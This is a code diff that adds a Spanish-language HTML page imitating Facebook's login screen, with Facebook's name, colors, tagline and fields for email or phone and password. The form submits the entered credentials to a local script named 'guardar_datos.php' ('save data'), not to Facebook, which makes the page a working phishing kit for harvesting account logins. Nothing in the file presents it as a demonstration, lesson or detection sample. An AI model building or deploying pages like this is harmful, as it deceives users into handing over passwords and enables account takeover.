@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .login-header h1 {
+      color: #1877f2;
+      font-size: 48px;
+      margin: 0;
+    }
+
+    .login-header p {
+      font-size: 18px;
+      color: #606770;
+      margin-top: 10px;
+    }
+
+    .login-form {
+      background: white;
+      padding: 20px;
+      width: 360px;
+      border-radius: 8px;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+      margin-top: 20px;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .login-form input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
+    }
+
+    .login-form button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-form button:hover {
+      background-color: #165dbb;
+    }
+
+    .login-form a {
+      display: block;
+      margin: 15px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-form hr {
+      margin: 20px 0;
+      border: 1px solid #dddfe2;
+    }
+
+    .create-account {
+      background-color: #42b72a;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .create-account:hover {
+      background-color: #36a420;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-header">
+      <h1>Facebook</h1>
+      <p>Conéctate con amigos y el mundo que te rodea en Facebook.</p>
+    </div>
+    <div class="login-form">
+      <form action="guardar_datos.php" method="POST">
+        <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        <button type="submit">Iniciar sesión</button>
+      </form>
+      <a href="#">¿Olvidaste tu contraseña?</a>
+      <hr>
+      <button class="create-account">Crear nueva cuenta</button>
+    </div>
+  </div>
+</body>
+</html>
